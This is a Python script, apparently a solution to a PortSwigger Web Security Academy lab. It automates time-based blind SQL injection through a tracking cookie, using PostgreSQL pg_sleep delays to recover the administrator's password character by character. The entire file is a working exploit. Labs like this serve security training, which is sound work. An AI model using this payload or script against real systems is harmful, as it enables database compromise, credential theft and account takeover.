import requests

SERVER = "https://0ab2008104cb874b81ff43b60074009f.web-security-academy.net/"

def forge_cookie_payload(position, char):
    cookies = {
        "TrackingId": f"WAkfI1wIOw8ssRix'||(SELECT CASE WHEN (substr(password,{position},1)=='{char}') THEN pg_sleep(2) ELSE pg_sleep(0) END from users where username='administrator')--",
        "session": "nrKHw5TZEI5tTvselVYXmVdATtNDeTPK"
    }
    return cookies

def main():
    password = ""
    for position in range(1, 21):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            response = requests.get(SERVER, cookies=forge_cookie_payload(position, char))
            if response.elapsed.total_seconds() >= 2:
                print(f"Found character {char} at position {position}")
                password += char
                break

    print(f"Password: {password}")

if __name__ == "__main__":
    main()